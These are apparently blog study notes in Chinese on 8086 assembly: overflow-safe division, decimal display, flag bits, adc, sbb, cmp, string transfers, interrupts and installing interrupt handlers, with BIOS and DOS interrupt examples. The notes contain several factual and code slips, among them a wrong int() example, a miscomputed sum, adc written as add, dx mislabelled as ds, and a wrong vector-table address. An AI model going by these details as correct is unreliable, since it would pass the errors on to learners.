bx进行的是16位除法，结果的商为11000H,而11000H在ax中存放不下。\n我们在用div指令做除法的时候，很可能发生上面的情况：结果的商过大，超出了寄存器所能存储的范围。\n当CPU执行div等除法指令的时候。如果发生这样的情况，将引发CPU的一个内部错误。这个错误被称为：除法溢出。\n我们可以通过特殊的程序来处理这个错误，这里我们不讨论这个错误的处理，这是后面的课程中要涉及的内容。\n好了，我们已经清楚了问题的所在：用div指令做除法的时候可能产生除法溢出。由于有这样的问题，在进行除法运算的时候要注意除数和被除数的值，比如1000000&#x2F;10就不能用div指令来计算。那么怎么办呢？我们用下面的子程序divdw解决。\n子程序描述名称：divdw功能：进行不会产生溢出的除法运算，被除数为dword型，除数为word型，结果为dword型。参数：(ax)&#x3D;dword型数据的低16位    (dx)&#x3D;dword型数据的高16位    (cx)&#x3D;除数返回：(dx)&#x3D;结果的高16位，(ax)&#x3D;结果的低16位    (cx)&#x3D;余数应用举例：计算1000000&#x2F;10(F4240H&#x2F;0AH)  mov ax,4240h  mov v dx,000fh  mov cx,0ah  call divdw\n提示给出一个公式：\nX：被除数，范围：[0,FFFF FFFF]N：除数，范围：[0,FFFF]H：X高16位，范围：[0,FFFF]L：X低16位，范围：[0,FFFF]\nint()：描述性运算符，取商，比如：rem(38&#x2F;10)&#x3D;8rem()：描述性运算符，取答数，比如：rem(38&#x2F;10)&#x3D;8\n公式：X&#x2F;N&#x3D;int(H&#x2F;N)*65536+[rem(H&#x2F;N)*65536+L]&#x2F;N\n这个公式将可能产生溢出的除法运算：X&#x2F;N，转变为多个不会产生溢出的除法运算。公式中，等号右边的所有除法运算都可以用div指令来做，肯定不会导致除法溢出。\nassume cs:code\n\ncode segment\nstart:  mov ax,4240h\n        mov dx,000fh\n        mov cx,0Ah\n        call divdw\n        mov ax,4c00H\n        int 21h\ndivdw:      ;子程序定义开始\n      push ax           ;低16位先保存\n      mov ax,dx         ;ax这时候的值是高16位了\n      mov dx,0          ;dx置0是为了不影响下边余数位，使得最高16位为0\n      div cx            ;H&#x2F;N\n      mov bx,ax         ;ax，bx的值为（int）H&#x2F;N，dx的值为（rem）H&#x2F;N\n      pop ax            ;ax的值现在是L\n      div cx            ;L&#x2F;N，注意，16位除法的时候默认被除数DX为高16位，AX为低16位\n      mov cx,dx\n      mov dx,bx\n      ret    ;子程序定义结束\n    code ends\nend start\n\n\n3.数值显示\n\n问题编程，将data段中的数据以十进制的形式显示出来。\ndata segment\ndw 123,12666,1,8,3,38\ndata ends\n\n  这些数据在内存中都是二进制信息，标记了数值的大小。\n  要把它们显示到屏幕上，成为我们能够读懂的信息，需要进行信息的转化。\n  比如，数值12666，在机器中存储为二进制信息：0011000101111010B(317AH)，计算机可以理解它。而我们要在显示器上读到可以理解的数值12666，我们看到的应该是一串字符：“12666”。\n  由于显卡遵循的是ASCII编码，为了让我们能在显示器上看到这串字符，它在机器中应以ASCII码的形式存储为：31H、32H、36H、36H、36H（字符“0”~“9”对应的ASCII码为30H ~ 39H）。\n  通过上面的分析可以看到，在概念世界中，有一个抽象的数据12666，它表示了一个数值的大小。\n  在现实世界中它可以有多种表示形式，可以在电子机器中以高低电平（二进制）的形式存储，也可以在纸上、黑板上、屏幕上以人类的语言“12666”来书写。\n  现在，我们面临的问题就是，要将同一抽象的数据，从一种表示形式转化为另一种表示形式。\n  可见，要将数据用十进制形式显示到屏幕上，要进行两步工作：（1）  将用二进制信息存储的数据转变为十进制形式的字符串：（2）  显示十进制形式的字符串。\n第二步我们在本次实验的第一个子程序中已经实现，在这里只要调用一下show_str即可。我们来讨论第一步，因为将二进制信息转变为十进制形式的字符串也是经常要用到的功能，我们应该为它编写一个通用的子程序。\n子程序描述名称：dtoc功能：将word型数据转变为表示十进制数的字符串，字符串以0为结尾符。参数：(ax)&#x3D;word型数据    ds:si指向字符串的首地址返回：无应用举例：编程，将数据12666以十进制的形式在屏幕的8行3列，用绿色显示出来。在显示时我们调用本次实验中的第一个子程序show-str。\nassume cs:code\n\ndata segment\n  db 16 dup(0)  ; 定义一个长度为16的数据段\ndata ends\n\n \ncode segment\nstart:  mov ax,12666  ; 将要显示的数字存储在寄存器ax中\n\n        mov bx,data     ; ds:si指向字符串的首地址\n        mov ds,bx\n        mov si,0\n\n        call dtoc       ; 调用子程序将整数转换为ASCII码字符串并存储在data段中\n\n        mov dh,8        ; 初始化打印的位置\n        mov dl,3\n        mov cl,2\n\n        call show_str   ; 开始打印字符串\n\n        mov ax,4c00h\n        int 21h        ; 程序结束\n\ndtoc:       ; 数值显示的子程序定义\n       mov cx,ax    \n       jcxz bk       ; 如果ax为0，则跳转到bk标签\n       push ax\n       mov al,ah\n       mov ah,0\n       mov bl,10\n       div bl\n       mov cl,al\n       mov ch,ah\n       pop ax\n       mov ah,ch\n       div bl\n       mov dl,ah\n       mov dh,0\n       push dx\n       mov ah,cl\n       jmp short dtoc   ; 跳转到dtoc标签\n\n    bk: pop ax \n        add ax,30h\n        mov [si],al\n        \n        pop ax \n        add ax,30h\n        mov [si+1],al\n       \n        pop ax \n        add ax,30h\n        mov [si+2],al\n        \n        pop ax \n        add ax,30h\n        mov [si+3],al    ; 将转换后的ASCII码存储在data段中\n        \n        pop ax \n        add ax,30h\n        mov [si+4],al\n        mov byte ptr [si+5],0  ; 字符串以null字符结尾\n        ret\n       \n     \nshow_str:\n     mov si,0\n     mov ax,0b800h\n     mov es,ax\n     \n     mov al,160\n     mul dh\n     mov bx,ax\n     mov al,2\n     mul dl\n     add bx,ax\n     mov al,cl\n    \n         s: mov cl,[si] \n              jcxz ok      ; 如果字符串长度为0，则跳转到ok标签\n              mov dx,[si]\n              mov es:[bx],dx\n              mov es:[bx+1],al\n              inc si\n              add bx,2\n              loop s\n\n ok: ret    \n  code ends\nend start\n\n","slug":"06","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"6565a0972dbac42ac41da60ecf87342f","title":"8086汇编学习笔记_07","content":"标志寄存器8086CPU的标志寄存器（也称flag）有16位，其中存储的信息通常被称为程序状态字（PSW）\n标志寄存器是按位起作用的。\n8086CPU的标志寄存器的结构：\n\n标志寄存器flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊含义。\n1. ZF标志flag的第6位是ZF，零标志位。\n它记录相关指令执行后，其结果是否为0。如果结果为0，那么ZF&#x3D;1；如果结果不为0，那么ZF&#x3D;0。\n对于ZF的值，我们可以这样来看，ZF标记相关指令的计算结果是否为0，如果为0，则在ZF要记录下“是0”这样的肯定信息。\n\n指令：mov ax,1and ax,0执行后，结果为0，则ZF-1，表示“结果是0”。\n指令：mov ax,1or ax,0执行后，结果不为0，则ZF&#x3D;0，表示“结果非0”。\n\n注意：在8086CPU的指令集中，有的指令的执行是影响标志寄存器的，比如,add、sub、mul、div、inc、or、and等，它们大都是运算指令(进行逻辑或算术运算)；有的指令的执行对标志寄存器没有影响，比如:mov、push、pop等，它们大都是传送指令。\n在使用一条指令的时候，要注意这些指令的全部功能，其中包括，执行结果对标志寄存器的哪些标志位造成影响。\n2. PF标志flag的第2位是PF，奇偶标志位。\n它记录相关指令执行后，其结果的所有二进制位中1的个数是否为偶数。如果的个数为偶数，PF&#x3D;1,如果为奇数，那么PF&#x3D;0。\n\n指令：mov al,1add al,10执行后，结果为00001011B，其中有3（奇数）个1，则PF&#x3D;0；\n指令：mov al,1or al,10执行后，结果为00000011B，其中有2（偶数）个1，则PF&#x3D;1；\n\n3. SF标志flag的第7位是SF，符号标志位。\n它记录相关指令执行后，其结果是否为负。如果结果为负，sf&#x3D;1；如果非负，sf&#x3D;0.\nSF标志，就是CPU对有符号运算结果的一种记录，它记录数据的正负。在我们将数据当作有符号数来运算的时候，可以通过它来得到结果的正负。如果我们将数据当作无符号来运算，SF的值则没有意义，虽然相关的指令影响了它的值。\n4. CF标志flag的第0位是CF，进位标志位。\n一般情况下，在进行无符号数运算的时候，记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。\n5. OF标志flag的第11位是OF，溢出标志位。\n一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF&#x3D;1；如果没有，OF&#x3D;0.\n一定要注意CF和OF的区别：CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位。\n\n对于无符号数运算，CPU用CF位来记录是否产生了进位；\n对于有符号数运算，CPU用OF位来记录是否产生了溢出。\n当然，还要用SF位来记录结果的符号。\n\n如果我们用add 指令进行的是有符号数运算，则98＋99＝-59这样的结果让人无法接受。\n\n造成这种情况的原因，就是实际的结果197，作为一个有符号数，在8位寄存器al中存放不下。\n\n对于有无符号，计算机是分不清楚状况的，因此他必须两种都记载着，要怎么用，看的是你当他是什么。\n\n例如：mov al 98dadd al,99d\n对于无符号数运算，98+99没有进位，CF&#x3D;0；\n对于有符号数运算，98+99发生溢出，OF&#x3D;1。\n\n\n\n6. adc指令adc是带进位的加法指令，它利用了CF位上记录的进位制。\n格式：adc 操作对象1,操作对象2功能：操作对象1&#x3D;操作对象1+操作对象2+CF比如：add ax,bx实现的功能是：（ax）&#x3D;（ax）+（bx）+ CF\n\n示例一：mov ax,2mov bx,1sub bx,axadc ax,1执行后，（ax）&#x3D; 4\n\nadc执行时，相当于计算：(ax)+1+CF&#x3D;2+1+1+4\n\n示例二：mov ax,1add ax,axadc ax,3执行后，(ax)&#x3D;5adc执行时，相当于计算：(ax)+3+CF&#x3D;2+3+0&#x3D;5\n\n在执行adc指令的时候加上的CF的值的含义，由adc指令前面的指令决定的，也就是说，关键在于所加上的CF值是被什么指令设置的。\n显然，如果CF的值是被sub指令设置的，那么它的含义就是借位值；如果是被add指令设置的，那么它的含义就是进位制。\n编程计算1EF000H+201000H，结果放在ax（高16位）和bx（低16位）中。\n\nmov ax,001EH\nmov bx,0F000H\nadd bx,1000H\nadc ax,0020H\n\nadc指令执行后，也可能产生进位值，所以也会对CF位进行设置。\n\n由于有这样的功能，我们就可以对任意大的数据及进行加法运算。\n\n7.sbb指令和adc类似，利用sbb指令我们可以对任意大的数据进行减法运算。\n8.cmp指令cmp是比较指令，功能相当于减法指令，只是不保存结果。\ncmp指令执行后，将对标志寄存器产生影响。\n其他相关指令通过识别这些被影响段的标志寄存器位来得知比较结果。\n格式：cmp 操作对象1,操作对象2\n作（ax）-（ax）的运算，结果为0，但并不在ax中保存，只影响flag的值。\n比如：\n\ncmp ax,ax\n\n指令执行后：ZF&#x3D;1PF&#x3D;1SF&#x3D;0CF&#x3D;0OF&#x3D;0\n\n\nmov ax,8mov bx,3cmp ax,bx\n\n执行后：（ax）&#x3D;8ZF&#x3D;0PF&#x3D;1SF&#x3D;0CF&#x3D;0OF&#x3D;0\n\n\n\n其实，我么通过cmp指令执行后，相关标志的值就可以看出比较的结果。\n\n现在我们可以看出比较指令的设计思路，即：通过做减法运算，影响标志位寄存器，标志寄存器的相关位记录了比较的结果。\n反过来看cmp ax,bx：\n\n同add、sub指令一样，CPU在执行cmp指令的时候，也包含两种含义：进行无符号数运算和进行有符号数运算。\n所以利用cmp指令可以对无符号数进行比较，也可以对有符号数进行比较。\n我们以cmp ah,bh为例进行说明：如果（ah）&#x3D;（bh），则（ah）-（bh）&#x3D;0，所以：ZF&#x3D;1；如果（ah）≠（bh），则（ah）-（bh）≠0，所以：ZF&#x3D;0；\n所以，我们根据cmp指令执行后ZF的值，就可以知道两个数据是否相等。\n\nCPU如何通过相关的标志位来表示比较的结果：\n\n（1）如果SF&#x3D;1，而OF&#x3D;0OF&#x3D;0，说明没有溢出，逻辑上真正的结果的正负&#x3D;实际结果的正负；因SF&#x3D;1，实际结果为负，所以逻辑上真正的结果为负，所以（ah）&lt;（bh）\n（2）如果SF&#x3D;1，而OF&#x3D;1OF&#x3D;1，说明有溢出，逻辑上真正的正负≠实际结果的正负；溢出导致了实际结果为负，那么逻辑上真正的结果必然为正，说明了（ah）&gt;（bh）\n（3）如果SF&#x3D;0，而OF&#x3D;1OF&#x3D;1，说明有溢出，逻辑上真正的正负≠实际结果的正负；溢出导致实际结果为正，那么逻辑上真正的结果必然为负，所以（ah）&lt;（bh）\n（4）如果SF&#x3D;0，而OF&#x3D;0OF&#x3D;0，说明没有溢出，逻辑上真正的结果的正负&#x3D;实际结果的正负；因SF&#x3D;0，实际结果为非负，所以逻辑上真正的结果必然为非负，所以（ah）≥（bh）\n9. 检测比较结果的条件转移指令条件转移指令检测被cmp指令影响的表示比较结果的标志位。\n这些条件转移指令通常和cmp相配合使用，就像call和ret指令通常相配合使用一样。\n因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，多以根据cmp指令的比较结果进行转移的指令也分两种：\n\n根据无符号数的比较结果进行转移的条件转移指令，它们检测ZF、CF的值；\n根据有符号数的比较结果进行转移的条件转移指令，它们检测SF、OF和ZF的值。\n\n\n10. DF标志和串传送指令flag的第10位是DF，方向标志位。\n在串处理指令中，控制每次操作后si、di的增减。\n\ndf&#x3D;0 每次操作后si、di递增\ndf&#x3D;1 每次操作后si、di递减\n\n下面有几个串传送指令\n格式:movsb\n功能:(以字节为单位传送)将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器DF位的值，将si和di递增或递减。\n执行movsb指令相当于进行下面几步操作。\n\n((es)*16+(di)) &#x3D; ((ds)*16+(si))\n\n如果df&#x3D;0 则 (si)&#x3D;(si)+1 (di)&#x3D;(di)+1\n\n\n　如果df&#x3D;1则: (si)&#x3D;(si)-1 (di)&#x3D;(di)-1\n当然也可以传送一个字：movsw\n格式:movsw\n功能：将ds:si指向的内存单元中的字送入es:di中，然后根据标志寄存器df位的值，将si和di递增2或递减2.\n\n\n\n\n\n\n\n\n\nmovsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用，格式如下:rep movsb\nrep功能:根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。\n由于flag的DF位决定着串传送指令执行后,si和di改变的方向,所以CPU应该提供相应的指令来对DF位进行设置,从而使程序员能够决定传送的方向.\n8086CPU提供下面两条指令对df位进行设置：\n\ncld指令: 将标志寄存器的df位置0\nstd指令: 将标志寄存器的df位置1\n\n&#x2F;&#x2F; 1. 编程，用串传送指令，将data段中的第一个字符串复制到它后面的空间中。\n\ndata segment\n     db  &#39;welcome to masm!&#39;\n     db 16 dup (0)\ndata ends\n\ncode segment\nstart: mov ax,data\n       mov ds,ax\n       mov si,0\n       mov es,ax\n       mov di,16\n       mov cx,16\n\n       cld\n       rep  movsb\n\n       mov ax,4c00h\n       int 21h\ncode ends\nend start\n\n&#x2F;&#x2F; 2.编程，用串传送指令，将F000段中的最后16个字符复制到data段中。\n\ndata segment\n         db  16  dup  (0)\ndata ends\n\ncode segment \nstart:     mov ax,0f000h\n           mov ds,ax\n           mov si,0ffffh\n           mov ax,data\n           mov es,ax\n           mov di,15\n           mov cx,16\n\n           std\n           rep  movsb\n\n           mov ax,4c00h\n           int 21h\ncode ends\nend start\n\n11. pushf和popfpushf:将标志寄存器的值压栈;\npopf:从栈中弹出数据,送入标志寄存器中;\npushf和popf,为直接访问标志位寄存器提供了一种方法\n内中断中断是CPU处理外部突发事件的一个重要技术；\n它能使CPU在运行过程中对外部事件发出的中断请求及时地进行处理,处理完成后又立即返回断点,继续进行CPU原来地工作。\n1. 中断分类引起中断地原因或者说发出中断请求地来源叫做中断源.根据中断源的不同,可以把中断分为硬件中断和软件中断两大类,而硬件中断又可以分为外部中断和内部中断两类。\n\n外部中断一般是由计算机外设发出的中断请求,如:键盘中断、打印机中断、定时器中断等。外部中断是可以屏蔽的中断，也就是说，利用中断控制器可以屏蔽这些外部设备的中断请求。\n\n内部中断是指因硬件出错（如突然掉电、奇偶校验错等）或运算出错（除数为零、运算溢出、单步中断等）所引起的中断。内部中断时不可屏蔽的中断。\n\n\n\n\n\n\n\n\n\n\n\n软件中断其实并不是真正的中断，它们只是可被调用执行的一般程序以及DOS的系统功能调用（INT 21H）等都是软件中断。\n2. 中断优先权CPU为了处理并发的中断请求，规定了中断的优先权，中断优先权由高到低的顺序是：（1）除法错、溢出中断、软件中断（2）不可屏蔽中断（3）可屏蔽中断（4）单步中断\n3. 中断类型码CPU的设计者必须在中断信息和其处理的程序的入口地址之间建立某种联系，使得CPU根据中断信息可以找到要执行的处理程序。\n我们知道，中断信息中包含有标识的中断类型码。根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。\nCPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。\n4. 中断向量表中断向量表在内存中存放，对于8086PC机，中断向量表指定放在内存地址0处。\n从内存0000:0000到0000:03FF的1024个单元中存放着中断向量表。\n5. 中断过程可以用中断类型码，在中断向量表中找到中断处理程序的入口；\n找到这个入口地址的最终目的时用它设置CS和IP，使CPU执行中断处理程序。\n用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的。\nCPU硬件完成这个工作的过程被称为中断过程。\n8086CPUde中断过程：（1）（从中断信息中）取得中断类型码；（2）标志寄存器的值入栈（保护标志位）（3）设置标志寄存器的第8位TF和第9位IF的值位0；（这一步的目的后面将介绍）（4）CS的内容入栈；（5）IP的内容入栈；（6）从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS。\n可以看到CPU将CS、IP保存在栈中。\n我们注意到，在中断过程中还要做的一个工作就是设置标志寄存器的TF、IF位。\n简洁的描述中断过程：（1）取得中断类型码N（2）pushf（3）TF&#x3D;0，IF&#x3D;0（4）push CS（5）push IP（6）（IP）&#x3D;（N * 4），（CS）&#x3D;（N * 4 + 2）在最后一步完成后，CPU开始执行由程序员编写的中断处理程序。\n6. 中断处理程序由于CPU随时都可能检测到中断信息，也就是说，CPU随时都可能执行中断处理程序，所以中断处理程序必须一直存储在内存某段空间之中。\n而中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表表项中。\n中断处理程序的编写方法和子程序的比较相似，下面是常规的步骤：（1）保存用到的寄存器；（2）处理中断；（3）恢复用到的寄存器；（4）用iret指令返回。\niret指令的功能用汇编语法描述为：pop IPpop CSpopf\niret通常和硬件自动完成的中断过程配合使用。\n可以看到，在中断过程中，寄存器入栈的顺序是标志寄存器、CS、IP，而iret的出栈顺序是IP、CS、标志寄存器，刚好和其对应，实现了用执行中断处理程序前的CPU现场恢复标志寄存器和CS、IP的工作。\niret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。\n7. 除法错误的中断处理程序当CPU执行div等除法指令的时候，如果发生了除法溢出错误，将产生中断类型码为0的中断信息，CPU将检测到这个信息，引发中断过程，转去执行0号中断所对应的中断处理程序。\n（1）当发生除法溢出的时候，产生0号中断信息，从而引发中断过程。\n\n此时，CPU将进行以下工作：\n\n获得中断类型码0；\n\n\n\n标志寄存器入栈，TF、IF设置为0；\n\n\n\nCS、IP入栈；\n\n\n\n（IP）&#x3D;（0 * 4），（CS）&#x3D;（0 * 4 + 2）\n\n\n\n\n\n（2）可见，当中断0发生时，CPU将转去执行中断处理程序。\n\n只要按照如下步骤编写中断处理程序，当中断0发生时，即可显示“Hello Word！”\n\n相关处理；\n\n\n\n向显示缓冲区送字符串“Hello Word！”；\n\n\n\n返回DOS。\n\n\n\n\n\n我们将这段程序称为do0。\n（3）现在的问题是：do0应该放在内存中。\n\n因为除法溢出随时可能发生，CPU随时都可能将CS:IP指向do0的入口，执行程序。\n\n&#x2F;&#x2F; 那么do0应该放在哪里？\n\n由于我们是在操作系统之上使用计算机，所有的硬件资源都在操作系统的管理之下，\n所以我们要想得到一块内存存放do0，应该向操作系统申请。\n\n但是在有可能的情况下，我们不去理会操作系统，而直接面向硬件资源。\n\n估计do0的长度不可能超过256个字节，内存0000:0200处就很合适。\n\n（4）我们将中断处理程序放到0000:0200后，若要使得除法溢出发生的时候，CPU转去执行do0，则必须将do0的入口地址（即0000:0200）登记在中断向量表的对应表项中。\n因为除法溢出对应的中断类型码为0，它的中断处理程序的入口地址应该从0*4地址单元开始存放，段地址存放在0*4+2字单元中，偏移地址存放在0*4字单元中。\n也就是说要将do0的段地址0存放在0000:0200字单元中，将偏移地址200H存放在0000:0000字单元中。\n程序框架：\nassume cs:code\ncode segment\nstart:\n    do0安装程序\n    设置中断向量表\n    mov ax,4c00h\n    int 21h\n  do0:\n    显示字符串 “Hello Word!”\n    mov ax,4c00h\n    int 21h\ncode ends\nend start\n\n程序执行时，do0的代码是不执行的，它只是作为do0安装程序所要传送的数据。\n执行do0安装程序，将do0的代码拷贝到内存0:200处，然后设置中断向量表，即偏移地址200H和段地址0，保存在0号表项中。这两部分工作完成后，程序就返回了。\ndo0的代码虽然在程序中，却不再程序执行的时候执行。它是在除法溢出发生的时候才得以执行的中断处理程序。\n8. 单步中断CPU在执行完一条指令之后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程。\n单步中断的中断类型码为1，则它所引发的中断过程如下：（1）取得中断类型码1；（2）标志寄存器入栈，TF、IF设置为0；（3）CS、IP入栈；（4）（IP）&#x3D;（1 * 4），（CS）&#x3D;（1 * 4 + 2）\n如上述所述，如果TF&#x3D;1，则执行一条指令后，CPU就要转去执行1号中断处理程序。\n9. 相应中断的特殊情况例如，在执行完向ss寄存器传送数据的指令后，即便检测到中断信号，CPU也不会响应。\n这样做的主要原因是，ss:sp联合指向栈顶，而对它们的设置应该连续完成。\n因为，如果在执行完设置ss的指令后，CPU响应中断，引发中断过程，要在栈中压入标志寄存器、CS和IP的值。\n而ss改变，sp并未改变，ss:sp指向的不是正确的栈顶，将引起错误。\nint指令int格式：int n  （n为中断类型码）。\n它的功能是引发中断过程。\n1. int指令CPU执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下：（1）取中断类型码n；（2）标志寄存器入栈，IF&#x3D;0，TF&#x3D;0；（3）CS、IP入栈；（4）（IP）&#x3D;（n * 4），（CS）&#x3D;（n*4+2）\n从此处转去执行n号中断的中断处理程序。\n可以在程序中使用int指令调用任何一个中断的中断处理程序。\nassume cs:code\ncode segment\n    start:mov ax,0b800h\n          mov es,ax\n          mov byte ptr es:[12*160+40*2],&#39;!&#39;\n          int 0\ncode ends\nend start\n\n程序执行后将在屏幕中间显示一个“ ! ”,然后显示“ Divide overflow” 后返回到系统中。”!”是编程显示的，程序是有做除法，但是在结尾使用了int 0指令。CPU执行int 0指令时，将引发中断过程，执行0号中断处理程序，而系统设置的0号中断处理程序的功能是显示“Divide overflow”, 然后返回到系统。\n可见，int指令的最终功能和call指令相似，都是调用一段程序。\n一般情况下，系统将一些具有一定功能的子程序，以中断处理程序的方式提供给应用程序调用。在编程的时候，可以用int 指令调用这些子程序。当然，也可以编写一些中断处理程序供别人使用。\n2. 编写供应用程序调用的中断例程\n\n\n\n\n\n\n\n\nint指令和iret指令的配合使用与call指令和ret指令的配合使用具有相似的思路。\n\n\n\n\n\n\n\n\n\n应该注意例程中用到的寄存器的值的保存和恢复。\n功能：求一word型数据的平方。参数：(ax)＝要计算的数据。返回值：dx、ax中存放结果的高16位和低16位。举例： 求2*3456^2\nassume cs:code\ncode segment\n    start:mov ax,3456    #(ax)&#x3D;3456\n        int 7ch    #调用中断7ch的中断过程,计算ax中的数据的平方,计算结果存在ds(高16位),ax(低16位)中\n        add ax,ax    #ds:ax中的值乘以2第一步,低16位相加,如果进位则CF&#x3D;1\n        adc dx,dx    #dx:ax中的值乘以2第二部,高16位相加并加上CF\n        mov ax,4c00h\n        int 21h\ncode ends\nend start\n\n写中断例程分三步:\n(1) 编写实现求平方功能的程序；(2) 安装程序，将其安装在0:200处；(3) 设置中断向量表，将程序的入口地址保存在7ch表项中，使其成为中断7ch的中断例程。\nassume cs :code\ncode segment\nstart:mov ax,cs\n    mov ds,ax\n    mov si,offset sqr    #设置ds:si指向源地址\n    mov ax,0\n    mov es,ax\n    mov di,200h          #设置es:di指向目的地址\n    mov cx,offset sqrend-offset sqr   #设置ex为传输长度\n    cld                               #设置传输方向为正\n    rep movsb    #从ds:si拷贝到es:di，每拷贝1个字节，cx-1\n    \n    mov ax,0\n    mov es,ax\n    mov word ptr es:[7ch*4],200h    #设置7ch中断程序的偏移量\n    mov word ptr es:[7ch*4+2],0   #设置7ch中断程序的段地址\n    \n    mov ax,4c00h\n    int 21h\n    \nsqr: mul ax\n    iret\nsqrend: nop\n\ncode ends\nend start\n\nCPU执行int 7ch指令进入中断例程之前，标志寄存器、当前的CS和IP被压入栈中，在执行完中断例程后，应该用iret指令恢复int 7ch执行前的标志寄存器和CS 、IP的值，从而接着执行应用程序。\n3. 对int、iret和栈的深入理解我们以一个程序来展开讨论:用7ch中断例程完成loop指令的功能，在屏幕中间显示80个”!”\n\n程序框架如下：\n\nassume cs:code\ncode segment\nstart:\n  mov ax,0b800h         ;向8086CPU显存的地址\n  mov di,160*12         ;显示位置\n  mov bx,offset s - offset se     ;跳转的位移\n  mov cx,80             ;循环次数\ns:\n  mov byte ptr es:[di],&#39;!&#39;\n  add di,2\n  int 7ch               ;进入中断处理程序\nse: nop\n  mov ax,4c00h\n  int 21h\n \ncode ends\nend start\n\n\n中断处理程序的功能如下:\n\n\ndec cx\n如果(cx)!&#x3D;0,转到标号s处执行，否则向下执行\n\n\n7ch 中断例程如何实现到目的地址的转移？\n\n转到标号 s 显然应该设 (CS) &#x3D; 标号 s 的段地址，(IP) &#x3D; 标号 s 的偏移地址。\n中断例程中，可以从栈里取得标号 s 的段地址和标号 se 的偏移地址，而用标号 se 的偏移地址加上 bx 中存放的转移位移就可以得到标号 s 的偏移地址。\n利用 iret 指令，设置 CS:IP。我们可以将栈中的 se 的偏移地址加上 bx 中的转移位移，则栈中的 se 得而偏移地址就变为了 s 的偏移地址。我们再使用 iret 指令，用栈中的内容设置 CS、IP，从而实现转移到标号 s 处。\n\n\n\n7c的中断程序如下:\nlp:\n  push bp\n  mov bp,sp\n  dec cx\n  jcxz lpret\n  add [bp+2],bx\nlpret:\n  pop bp\n  iret\n\n4. BIOS 和 DOS 所提供的中断例程在系统板的 ROM 中存放着一套程序，称为 BIOS(基本输入输出系统)，BIOS 中主要包含以下几部分内容：\n\n硬件系统的检测和初始化程序；\n外部中断和内部终端的中断例程；\n用于对硬件设备进行 I&#x2F;O 操作的中断例程；\n其他和硬件系统相关的中断例程。\n\n操作系统 DOS 也提供了中断例程，从操作系统的角度来看，就是向程序员提供了编程资源。\nBIOS和DOS在所提供的中断例程中包含了许多子程序，这些子程序实现了程序员在编程的时候经常需要用到的功能。程序员在编程的时候，可以用int指令直接调用BIOS和DOS提供的中断例程，来完成某些工作。\n和硬件设备相关的DOS中断例程中，一般都调用了BIOS的中断例程。\n5. BIOS 和 DOS 中断例程的安装\n6. BIOS 中断例程应用int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序。\n一般来说，一个中断例程中往往包含多个子程序，中断例程内部用传递进来的参数来决定执行哪一个子程序。BIOS 和 DOS 都用 ah 来传递内部子程序的编号。\n\n(ah)&#x3D;2 表示调用第10h 号中断例程的2号子程序，功能为设置光标位置，可以提供光标所在的行号(80 * 25 字符模式下： 0～24) 、列号(80 * 25 字符模式下： 0～79) ，和页号作为参数。\n\n(bh)&#x3D;0, (dh)&#x3D;5, (dl)&#x3D; 12, 设置光标到第0页， 第5行， 第12列。\n\n\nbh中页号的含义：内存地址空间中， B8000H~BFFFFH共32kB 的空间，为80*25彩色字符模式的显示缓冲区。\n一屏的内容在显示缓冲区中共占4000 个字节。\n也就是说，通常情况下，B8000H~B8F9FH中的4000个字节的内容将出现在显示器上。\n显示缓冲区分为8 页，每页4KB(4000B) ，显示器可以显示任意一页的内容。一般情况下，显示第0页的内容。\n&#x2F;&#x2F; 编程：在屏幕的5行12列显示3个红底高亮闪烁绿色的&#39;a&#39;。\nassume cs:code\ncode segment\n    mov ah,2    ;置光标\n    mov bh,0    ;第0页\n    mov dh,5    ;dh中放行号\n    mov dl,12   ;dl中放列号\n    int 10h\n    \n    mov ah,9    ;在光标位置显示字符\n    mov al,&#39;a&#39;  ;字符\n    mov bl, 11001010b    ;颜色属性\n    mov bh,0    ;第0页\n    mov cx,3    ;字符重复个数\n    int 10h\n    \n    mov ax,4c00h\n    int 21h\ncode ends\nend\n\n7. DOS中断例程应用int 21h 中断例程是DOS 提供的中断例程，其中包含了DOS 提供给程序员在编程时调用的子程序。\nint 21h中断例程的4ch号功能，即程序返回功能，如下：mov ah,4ch    ;程序返回mov al,0      ;返回值int 21h\n(ah)&#x3D;4ch表示调用第21h号中断例程的4ch号子程序，功能为程序返回，可以提供返回值作为参数。\n&#x2F;&#x2F; int 21h中断例程在光标位置显示字符串的功能：\nds:dx指向字符串   ;要显示的字符串需用“$”作为结束符\nmov ah,9         ;功能号9,表示在光标位置显示字符串\nint 21h\n\n(ah)&#x3D;9 表示调用第21h 号中断例程的9 号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。\n编程：在屏幕的5行12列显示字符串“Welcome to masm!”。\nassume cs:code\n\ndata segment\n    db &#39;Welcome to masm&#39;,&#39;$&#39;\ndata ends\n\ncode segment\n    start:mov ah,2    ;置光标\n    mov bh,0          ;第0 页\n    mov dh,5          ;dh中放行号\n    mov dl,12         ;dl 中放列号\n    int 10h\n    \n    mov ax,data\n    mov ds,ax\n    mov dx,0          ;ds:dx指向字符串的首地址data:O\n    mov ah,9\n    int 21h\n    \n    mov ax,4c00h\n    int 21h\ncode ends\n\nend start\n\n上述程序在屏幕的5行12列显示字符串“Welcome to masm!”, 